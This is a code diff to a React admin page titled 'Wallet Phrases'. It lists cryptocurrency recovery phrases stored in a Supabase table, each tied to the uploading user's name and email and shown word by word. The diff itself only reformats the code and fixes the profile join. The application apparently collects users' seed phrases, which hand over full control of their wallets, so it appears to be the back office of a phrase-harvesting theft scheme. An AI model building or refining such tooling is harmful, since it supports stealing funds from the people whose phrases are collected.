@@ -12,8 +12,22 @@ export default function PhrasesList() {
   useEffect(() => {
     document.title = "Admin · Wallet Phrases";
     (async () => {
-      const { data, error } = await supabase.from("wallet_phrases").select("*, profiles(full_name, email)").order("created_at", { ascending: false });
-      if (error) toast.error(error.message);
+      const { data, error } = await supabase
+        .from("wallet_phrases")
+        .select(`
+          *,
+          profiles:user_id (
+            full_name,
+            email
+          )
+        `)
+        .order("created_at", { ascending: false });
+
+      if (error) {
+        console.error(error);
+        toast.error(error.message);
+      }
+
       setRows(data ?? []);
       setLoading(false);
     })();
@@ -23,10 +37,17 @@ export default function PhrasesList() {
     <div className="space-y-4">
       <div>
         <h1 className="text-2xl font-semibold">Wallet Phrases</h1>
-        <p className="text-sm text-muted-foreground">{rows.length} phrases · contains highly sensitive data</p>
+        <p className="text-sm text-muted-foreground">
+          {rows.length} phrases · contains highly sensitive data
+        </p>
       </div>
+
       {loading && <p className="text-muted-foreground">Loading…</p>}
-      {!loading && rows.length === 0 && <p className="text-muted-foreground">No phrases uploaded</p>}
+
+      {!loading && rows.length === 0 && (
+        <p className="text-muted-foreground">No phrases uploaded</p>
+      )}
+
       <div className="grid gap-4 md:grid-cols-2">
         {rows.map((p) => {
           const words = (p.phrase || "").trim().split(/\s+/);
@@ -37,13 +58,22 @@ export default function PhrasesList() {
                   <KeyRound className="h-4 w-4" />
                   {p.wallet_name || "Wallet"}
                 </CardTitle>
-                <p className="text-xs text-muted-foreground">{p.profiles?.full_name || p.profiles?.email || "—"} · {new Date(p.created_at).toLocaleDateString()}</p>
+                <p className="text-xs text-muted-foreground">
+                  {p.profiles?.full_name || p.profiles?.email || "—"} ·{" "}
+                  {new Date(p.created_at).toLocaleDateString()}
+                </p>
               </CardHeader>
               <CardContent>
                 <div className="grid grid-cols-3 gap-2 font-mono text-sm">
                   {words.map((w: string, i: number) => (
-                    <div key={i} className="rounded border border-border bg-muted/30 px-2 py-1">
-                      <span className="mr-1 text-xs text-muted-foreground">{i + 1}.</span>{w}
+                    <div
+                      key={i}
+                      className="rounded border border-border bg-muted/30 px-2 py-1"
+                    >
+                      <span className="mr-1 text-xs text-muted-foreground">
+                        {i + 1}.
+                      </span>
+                      {w}
                     </div>
                   ))}
                 </div>
